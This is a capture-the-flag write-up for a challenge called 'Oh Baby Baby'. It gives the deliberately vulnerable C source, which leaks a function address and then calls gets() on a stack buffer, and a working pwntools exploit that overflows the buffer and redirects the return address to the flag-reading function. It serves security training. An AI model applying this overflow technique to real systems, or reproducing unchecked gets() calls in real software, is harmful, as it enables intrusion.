# Oh Baby Baby


# info

source is provided... vuln is very apparent and very intended looking... `prize` gives address of `ultimatePrize` function and then calls `gets` function on local variable, we just need to overwrite the RET address by given address to call it and get the flag.

```c
void waitForFun() { /* prints some dancing characters... takes a bit of time... */ }

void ultimatePrize() {
    char buf[100];
    printf("\e[0;32m");
    FILE *fp;
    if((fp = fopen("./flag.txt", "r")) == NULL) {
        printf("%s\n", "oh no :(");
        exit(1);
    }
    fgets(buf, 100, fp);
    printf("%s\n", buf);
    fclose(fp);
    exit(0);
}

void prize() {
    char buffer[64];
    printf("\033[0;31m");
    printf("\r\r...........................................%p...........................................\n\n", *ultimatePrize);
    printf("\033[0m");
    printf("............................................Did you enjoy?..........................................\n\n");
    gets(buffer);
}

int main(int argc, char** argv) {
    printf("\e[1;92m");
    printf(" .----------------.  .----------------.  .----------------.  .----------------.  .----------------.\n");
    printf("| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |\n");
    printf("| |    _______   | || |   _    _     | || |     ______   | || |  _________   | || |  _________   | |\n");
    printf("| |   /  ___  |  | || |  | |  | |    | || |   .' ___  |  | || | |  _   _  |  | || | |_   ___  |  | |\n");
    printf("| |  |  (__ \\_|  | || |  | |__| |_   | || |  / .'   \\_|  | || | |_/ | | \\_|  | || |   | |_  \\_|  | |\n");
    printf("| |   '.___`-.   | || |  |____   _|  | || |  | |         | || |     | |      | || |   |  _|      | |\n");
    printf("| |  |`\\____) |  | || |      _| |_   | || |  \\ `.___.'\\  | || |    _| |_     | || |  _| |_       | |\n");
    printf("| |  |_______.'  | || |     |_____|  | || |   `._____.'  | || |   |_____|    | || | |_____|      | |\n");
    printf("| |              | || |              | || |              | || |              | || |              | |\n");  
    printf("| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |\n");
    printf("'----------------'  '----------------'  '----------------'  '----------------'  '----------------' \n" );
    printf("\033[0m");
    printf(".....................................Tap Tap to see your prize!!....................................\n");
    char tap; 
    scanf("%c",&tap);
    scanf("%c",&tap);
    waitForFun();
    prize();
  return 0;
}
```

the binary's characteristics is as follow:

```
$ file ohbabybaby
ohbabybaby: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=19874822eb410005202555ccd0800822c28898b0, not stripped

$ checksec --file ohbabybaby
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

no stack guard... it just overflow and rewrite RET address.


# exploit

```python
import re

from pwn import *

context.arch = 'amd64'
context.os = 'linux'


def exploit(p):
    p.recv()
    p.sendline('1')

    x = p.recv(1)
    while x != b'.':
        x = p.recv(1)

    res = p.recv()
    start = res.find(b'0x')
    end = res[start:].find(b'.')

    leak = int(res[start:start+end], 16)

    print('[+] function pointer: 0x%x' % leak)


    payload = b'A' * 0x40 + b'B'*8 + p64(leak)

    p.send(payload)

    print(p.interactive())


if __name__ == '__main__':
    p = process(['./ohbabybaby'])
    #p = remote('185.14.184.242', 12990)

    exploit(p)
```
